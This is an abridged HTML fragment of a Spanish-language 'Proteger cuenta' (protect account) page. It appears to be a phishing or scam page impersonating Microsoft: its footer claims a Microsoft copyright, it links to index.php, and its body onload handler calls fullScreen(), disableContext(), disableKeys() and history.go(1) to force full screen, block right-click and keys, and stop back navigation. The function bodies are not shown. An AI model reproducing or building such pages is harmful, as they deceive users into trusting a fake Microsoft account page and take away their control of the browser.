<html>
<head id="ctl00_Head">
  <link href="styles.css" type="text/css" rel="stylesheet"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>
...
<body onload="fullScreen(); disableContext(); disableKeys(); javascript:history.go(1)">
            ...
            <div class="row">
                ...
                <div class="col-12 col-sm-5 col-md-6">
                    <div class="text-center p-4">
                        ...
                        <span id="ctl00_lblFecha">Fecha Actual 20/03/2024 11:55:12 pm </span>
    ...
    <br>
    <br>
		<h2 class="titlex">Proteger cuenta</h2>
...
<div class="footer ContactFrame text-center" style="padding-top: 10px">
    ...
    <div id="ContactFrame1" class="pb-5">
        ...
        Todos los Derechos Reservados © 2011-2024 Microsoft<br>
        Para conocer acerca de la utilización de Información,<br>
        <a id="ctl00_HyperLink1" href="index.php" target="_blank">Ingresa aquí</a>
    </div>
</div>
